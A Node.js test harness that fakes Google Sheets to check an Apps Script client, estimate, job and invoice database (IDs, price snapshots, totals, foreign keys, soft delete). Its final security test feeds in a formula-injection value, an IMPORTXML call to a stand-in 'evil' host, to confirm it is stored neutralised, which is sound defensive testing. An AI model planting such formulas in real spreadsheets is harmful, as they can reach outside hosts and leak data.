// Fake-Sheets sandbox: load db.gs + setup.gs, run setupDatabase() on a fresh spreadsheet, then
// walk the full flow through db.gs and assert IDs / snapshots / caches / FK integrity.
const fs = require('fs'), vm = require('vm'), path = require('path');

/* ---------- minimal but faithful Apps Script Sheets fake ---------- */
function colNum(letters){ let n=0; for(const ch of letters) n=n*26+(ch.charCodeAt(0)-64); return n; }
class Sheet {
  constructor(name){ this.name=name; this.data=[]; this.frozen=0; this.hidden=false; this.colFmt={}; this.colValid={}; }
  _ensure(r,c){ while(this.data.length<r) this.data.push([]); const row=this.data[r-1]; while(row.length<c) row.push(''); }
  getName(){ return this.name; }
  clear(){ this.data=[]; this.colFmt={}; this.colValid={}; return this; }
  setFrozenRows(n){ this.frozen=n; return this; } getFrozenRows(){ return this.frozen; }
  hideSheet(){ this.hidden=true; return this; } isSheetHidden(){ return this.hidden; }
  setColumnWidth(){ return this; }
  getMaxRows(){ return Math.max(1000, this.data.length); }
  getMaxColumns(){ return Math.max(26, this.data.reduce((m,r)=>Math.max(m,r.length),0)); }
  getLastRow(){ let last=0; for(let r=0;r<this.data.length;r++){ if((this.data[r]||[]).some(v=>v!=='' && v!=null)) last=r+1; } return last; }
  getLastColumn(){ return this.data.reduce((m,r)=>Math.max(m,r.length),0); }
  appendRow(arr){ const r=this.getLastRow()+1; this._ensure(r,arr.length); for(let c=0;c<arr.length;c++) this.data[r-1][c]=arr[c]; return this; }
  getDataRange(){ return this.getRange(1,1,Math.max(1,this.getLastRow()),Math.max(1,this.getLastColumn())); }
  getRange(a,b,c,d){
    if(typeof a==='string'){
      let m;
      if(m=a.match(/^([A-Z]+)(\d+):([A-Z]+)$/)) return new Range(this,{whole:colNum(m[1])});           // e.g. C2:C
      if(m=a.match(/^([A-Z]+)(\d+):([A-Z]+)(\d+)$/)) { const c1=colNum(m[1]),c2=colNum(m[3]); return new Range(this,{r:+m[2],c:c1,nr:+m[4]-+m[2]+1,nc:c2-c1+1}); }
      if(m=a.match(/^([A-Z]+)(\d+)$/)) return new Range(this,{r:+m[2],c:colNum(m[1]),nr:1,nc:1});
      throw new Error('a1 not supported: '+a);
    }
    return new Range(this,{r:a,c:b,nr:c||1,nc:d||1});
  }
}
class Range {
  constructor(sh,spec){ this.sh=sh; this.s=spec; }
  setValues(vals){ const {r,c,nr,nc}=this.s; for(let i=0;i<nr;i++){ this.sh._ensure(r+i,c+nc-1); for(let j=0;j<nc;j++) this.sh.data[r+i-1][c+j-1]=vals[i][j]; } return this; }
  getValues(){ const {r,c,nr,nc}=this.s; const out=[]; for(let i=0;i<nr;i++){ const row=[]; for(let j=0;j<nc;j++){ const rr=this.sh.data[r+i-1]||[]; const v=rr[c+j-1]; row.push(v===undefined?'':v); } out.push(row); } return out; }
  setValue(v){ this.s.nr=1; this.s.nc=1; return this.setValues([[v]]); }
  getValue(){ return this.getValues()[0][0]; }
  setNumberFormat(f){ if(this.s.whole) this.sh.colFmt[this.s.whole]=f; return this; }
  setFontWeight(){ return this; } setBackground(){ return this; }
  insertCheckboxes(){ if(this.s.whole) this.sh.colFmt[this.s.whole]='checkbox'; return this; }
  setDataValidation(dv){ if(this.s.whole) this.sh.colValid[this.s.whole]=dv; return this; }
  clearDataValidations(){ return this; }
}
class Spreadsheet {
  constructor(){ this.sheets=[]; this.active=null; }
  getSheetByName(n){ return this.sheets.find(s=>s.name===n)||null; }
  insertSheet(n){ const s=new Sheet(n); this.sheets.push(s); this.active=s; return s; }
  deleteSheet(s){ this.sheets=this.sheets.filter(x=>x!==s); }
  setActiveSheet(s){ this.active=s; return s; }
  moveActiveSheet(pos){ const s=this.active; this.sheets=this.sheets.filter(x=>x!==s); this.sheets.splice(pos-1,0,s); }
  getId(){ return 'FAKESHEET'; }
}
const SS = new Spreadsheet();
const SpreadsheetApp = {
  getActiveSpreadsheet: ()=>SS,
  newDataValidation: ()=>{ const dv={_list:null}; return { requireValueInList:(l)=>{dv._list=l; return this_dv();}, }; },
};
// chainable data validation builder
function this_dv(){ const dv={_list:null}; const api={ requireValueInList:(l)=>{dv._list=l; return api;}, setAllowInvalid:()=>api, build:()=>({list:dv._list}) }; return api; }
SpreadsheetApp.newDataValidation = ()=>this_dv();
const LockService = { getScriptLock: ()=>({ waitLock:()=>true, releaseLock:()=>true, tryLock:()=>true }) };

/* ---------- load the real files into one shared context ---------- */
const ctx = { SpreadsheetApp, LockService, Date, Math, JSON, String, Number, Object, Array, Boolean, console };
vm.createContext(ctx);
vm.runInContext(fs.readFileSync(path.join(__dirname,'..','db.gs'),'utf8'), ctx);
vm.runInContext(fs.readFileSync(path.join(__dirname,'..','setup.gs'),'utf8'), ctx);
const R = (code)=>vm.runInContext(code, ctx);
const call = (name, ...args)=>{ ctx.__args=args; return vm.runInContext(name+'(...__args)', ctx); };

let pass=0, fail=0;
function ok(cond,msg){ (cond?pass++:fail++); console.log((cond?'  ✓ ':'  ✗ FAIL ')+msg); }

/* ---------- 1) setupDatabase ---------- */
console.log('\n=== setupDatabase() ===');
const rep = call('setupDatabase');
ok(rep.ok, 'schema verify ok (errors: '+JSON.stringify(rep.errors)+')');
console.log('  tables:', Object.keys(rep.tables).map(t=>t+':'+rep.tables[t].dataRows+'rows'+(rep.tables[t].headersMatch?'':' HDR!')).join('  '));
ok(rep.tables.Clients.headersMatch && rep.tables.LineItems.headersMatch, 'headers match SCHEMA');
ok(rep.tables.Clients.frozenRows===1, 'header row frozen');
ok(rep.tables._meta.hidden===true, '_meta hidden');
ok(rep.seededServices===5, 'seeded 5 services (got '+rep.seededServices+')');
// checkboxes + dropdowns recorded
const clientsSheet = SS.getSheetByName('Clients');
ok(clientsSheet.colFmt[11]==='checkbox', 'Clients.Archived is a checkbox');
ok(!!clientsSheet.colValid[6], 'Clients.Status has a dropdown');
ok(clientsSheet.colFmt[9]==='$#,##0.00', 'Clients.LifetimeSpent has currency format');
ok(clientsSheet.colFmt[1]==='@', 'Clients.ClientID is plaintext');

/* ---------- 2) end-to-end flow ---------- */
console.log('\n=== end-to-end flow (all by ID) ===');
// give two services real rates so snapshot pricing is visible
const svcs = call('getAll','Services');
const consult = svcs.find(s=>s.ServiceName==='Consultation').ServiceID;
const standard = svcs.find(s=>s.ServiceName==='Standard service').ServiceID;
call('update','Services',consult,{DefaultRate:90});
call('update','Services',standard,{DefaultRate:150});

// Client as Lead
const client = call('insert','Clients',{Name:'Ada Client',Phone:'(555) 010-2020',Email:'ada@x.com',Status:'Lead',Source:'Referral'});
ok(client.ClientID==='CL-0001','client id CL-0001 (got '+client.ClientID+')');
ok(client.Status==='Lead' && client.Archived===false,'client seeded Lead, not archived');

// Estimate + line items (snapshot rate/description from services)
const est = call('insert','Estimates',{ClientID:client.ClientID,IssueDate:new Date('2026-07-16'),ValidUntil:new Date('2026-07-30'),Status:'Draft'});
ok(est.EstimateID==='EST-1001','estimate id EST-1001 (got '+est.EstimateID+')');
call('insertMany','LineItems',[
  {DocType:'Estimate',DocID:est.EstimateID,ServiceID:consult,Qty:1},
  {DocType:'Estimate',DocID:est.EstimateID,ServiceID:standard,Qty:2},
]);
const estTotal = call('recalcDocTotal','Estimate',est.EstimateID);
ok(estTotal===90+2*150,'estimate total = 90 + 2*150 = '+estTotal);
ok(call('getById','Estimates',est.EstimateID).Total===390,'Estimates.Total cached = 390');
const eli = call('query','LineItems',{DocID:est.EstimateID});
ok(eli[0].Description==='Consultation' && eli[0].Rate===90,'line item snapshotted Description+Rate');

// snapshot integrity: change the service rate AFTER the line item exists → line item unchanged
call('update','Services',consult,{DefaultRate:999});
ok(call('getById','LineItems',eli[0].LineItemID).Rate===90,'snapshot Rate stays 90 after service rate changed');

// convert to a Job; client Lead → Active
const job = call('insert','Jobs',{ClientID:client.ClientID,ServiceID:standard,JobDate:new Date('2026-07-20'),Status:'Scheduled',Recurring:'None'});
ok(job.JobID==='JOB-00001','job id JOB-00001 (got '+job.JobID+')');
ok(job.ServiceName==='Standard service','job snapshotted ServiceName');
call('update','Clients',client.ClientID,{Status:'Active'});
ok(call('getById','Clients',client.ClientID).Status==='Active','client promoted Lead→Active');

// Invoice (links Job by ID) + line items
const inv = call('insert','Invoices',{ClientID:client.ClientID,JobID:job.JobID,IssueDate:new Date('2026-07-20'),DueDate:new Date('2026-08-03'),Status:'Draft'});
ok(inv.InvoiceID==='INV-9001','invoice id INV-9001 (got '+inv.InvoiceID+')');
ok(inv.JobID===job.JobID,'invoice references job by ID');
call('insertMany','LineItems',[{DocType:'Invoice',DocID:inv.InvoiceID,ServiceID:standard,Qty:2}]);
const invTotal = call('recalcDocTotal','Invoice',inv.InvoiceID);
ok(invTotal===300,'invoice total cached = 300');

// lifetime before paid = 0, after paid = 300
ok(call('getById','Clients',client.ClientID).LifetimeSpent===0,'LifetimeSpent 0 while invoice Draft');
call('update','Invoices',inv.InvoiceID,{Status:'Paid'});
const life = call('recalcClientLifetime',client.ClientID);
ok(life===300,'recalcClientLifetime = 300 after Paid');
ok(call('getById','Clients',client.ClientID).LifetimeSpent===300,'Clients.LifetimeSpent cached = 300');

/* ---------- 3) integrity rules ---------- */
console.log('\n=== integrity ===');
let threw=false; try{ call('insert','Jobs',{ClientID:'CL-9999',ServiceID:standard,JobDate:new Date()}); }catch(e){ threw=true; }
ok(threw,'FK validation rejects a Job with a non-existent ClientID');
threw=false; try{ call('insert','Clients',{Name:'Bad',Status:'Nope'}); }catch(e){ threw=true; }
ok(threw,'enum validation rejects Clients.Status="Nope"');
// soft delete
call('softDelete','LineItems',eli[0].LineItemID);
ok(call('getById','LineItems',eli[0].LineItemID).Archived===true,'softDelete sets Archived=true (row still present)');
ok(call('query','LineItems',{DocID:est.EstimateID}).length===1,'getAll/query exclude archived rows');
// no formulas anywhere: every stored cell is a primitive/Date, never a string starting with "="
let formulaFound=false;
SS.sheets.forEach(sh=>sh.data.forEach(row=>row.forEach(v=>{ if(typeof v==='string' && v[0]==='=') formulaFound=true; })));
ok(!formulaFound,'no cell contains a formula');

console.log('\n=== review fixes (db) ===');
// M2: LineTotal rounded to cents (33.331×3 = 99.993 → stored as 99.99, not the raw 99.993)
call('update','Services',consult,{DefaultRate:33.331});
const e2=call('insert','Estimates',{ClientID:client.ClientID,IssueDate:new Date('2026-07-16'),Status:'Draft'});
const li2=call('insert','LineItems',{DocType:'Estimate',DocID:e2.EstimateID,ServiceID:consult,Qty:3});
ok(li2.LineTotal===99.99,'M2: LineTotal rounded to cents (3×33.331 → 99.99, got '+li2.LineTotal+')');
// M3: a line item's DocType/DocID is immutable
let immThrew=false; try{ call('update','LineItems',li2.LineItemID,{DocType:'Invoice'}); }catch(e){ immThrew=true; }
ok(immThrew,'M3: changing a line item DocType is rejected');
// H1 + allowArchivedRef: line item MAY reference an archived Service (price snapshotted)…
const svcTmp=call('insert','Services',{ServiceName:'Temp',DefaultRate:10,Active:true}); call('softDelete','Services',svcTmp.ServiceID);
let svcThrew=false; try{ call('insert','LineItems',{DocType:'Estimate',DocID:e2.EstimateID,ServiceID:svcTmp.ServiceID,Qty:1}); }catch(e){ svcThrew=true; }
ok(!svcThrew,'H1: line item may reference an ARCHIVED service (snapshot protects history)');
// …but a Job may NOT reference an archived Client
const cTmp=call('insert','Clients',{Name:'Temp',Status:'Lead'}); call('softDelete','Clients',cTmp.ClientID);
let cliThrew=false; try{ call('insert','Jobs',{ClientID:cTmp.ClientID,ServiceID:standard,JobDate:new Date()}); }catch(e){ cliThrew=true; }
ok(cliThrew,'H1: FK rejects a Job pointing at an ARCHIVED client');
// H3: recalc uses the doc's stamped TaxRate, not the live setting
call('settingSet','Sales tax %',10);
const e3=call('insert','Estimates',{ClientID:client.ClientID,IssueDate:new Date('2026-07-16'),Status:'Draft',TaxRate:5});
call('insert','LineItems',{DocType:'Estimate',DocID:e3.EstimateID,ServiceID:standard,Qty:1});  // standard = 150
ok(call('recalcDocTotal','Estimate',e3.EstimateID)===157.5,'H3: recalc uses stamped 5% (150→157.50), ignoring live 10%');

console.log('\n=== security: formula/CSV injection guard ===');
const evil=call('insert','Clients',{Name:'=IMPORTXML("http://evil","//x")',Notes:'+CMD',Status:'Lead'});
const evilRow=SS.getSheetByName('Clients').data.find(r=>String(r[0])===evil.ClientID);
ok(String(evilRow[1])[0]==="'" , 'H1: a Name starting with "=" is stored neutralized with a leading apostrophe (not a formula)');
ok(String(evilRow[9])[0]==="'" , 'H1: Notes starting with "+" is neutralized too');
const safe=call('insert','Clients',{Name:'Normal Person',Status:'Lead'});
const safeRow=SS.getSheetByName('Clients').data.find(r=>String(r[0])===safe.ClientID);
ok(String(safeRow[1])==='Normal Person', 'H1: ordinary names are stored unchanged (no apostrophe)');

console.log('\n=== RESULT: '+pass+' passed, '+fail+' failed ===');
process.exit(fail?1:0);
